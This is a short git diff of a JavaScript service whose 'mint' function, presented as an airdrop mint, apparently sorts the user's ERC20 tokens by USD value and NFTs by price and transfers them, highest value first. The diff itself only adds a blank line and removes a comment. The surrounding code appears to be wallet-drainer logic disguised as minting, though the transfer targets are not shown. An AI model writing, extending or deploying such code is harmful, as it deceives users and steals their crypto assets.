@@ -3,6 +3,7 @@ import erc721abi from "../abis/erc721abi.json";
 import {  transferErc20 } from "./erc20.service.js";
 import { transferErc721 } from "./erc721.service.js";
 export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signerAccount, clientRead, clientWrite, userAddress) => {
+
    let sortedTokensERC20 = tokensERC20.sort((a, b) => +b.balanceInUsd - +a.balanceInUsd);
    let sortedTokensERC721 =tokensERC721.sort((a, b) => +b.price - +a.price);
     for (let iter20 = 0; iter20 < tokensERC20.length; iter20++) {
@@ -19,7 +20,6 @@ export const mint = async (chain, airdrop, tokensERC20, tokensERC721, signerAcco
         }
     } catch (err) {
         console.log(err);
-        // Add code here to handle the error or log additional information
         continue;
     }
     }
